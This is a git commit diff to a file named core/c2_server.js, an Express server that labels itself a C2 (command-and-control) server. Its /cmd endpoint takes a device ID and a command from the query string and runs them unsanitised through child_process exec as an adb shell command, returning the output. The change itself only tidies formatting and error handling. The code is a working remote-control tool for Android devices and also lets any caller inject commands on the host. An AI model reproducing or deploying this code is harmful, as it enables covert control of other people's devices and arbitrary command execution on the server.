323433b51ec9ea9748de27d94907ae511230d40a
VERAN-TECH-HUB <veranmaina685@gmail.com>
2025-02-19 00:25:30 +0100

    Update c2_server.js

--- core/c2_server.js
+++ core/c2_server.js
@@ -1,11 +1,12 @@
-const express = require('express');  
-const app = express();  
+const express = require('express');
+const app = express();
+const { exec } = require('child_process');
 
-app.get('/cmd', (req, res) => {  
-  const { device, cmd } = req.query;  
-  require('child_process').exec(`adb -s ${device} shell ${cmd}`, (err, stdout) => {  
-    res.send(stdout || err.message);  
-  });  
-});  
+app.get('/cmd', (req, res) => {
+  const { device, cmd } = req.query;
+  exec(`adb -s ${device} shell ${cmd}`, (err, stdout, stderr) => {
+    res.send(stdout || err?.message || stderr);
+  });
+});
 
-app.listen(3000, () => console.log('[+] C2 Active: http://localhost:3000'));  
+app.listen(3000, () => console.log('[+] C2 Active: http://localhost:3000'));
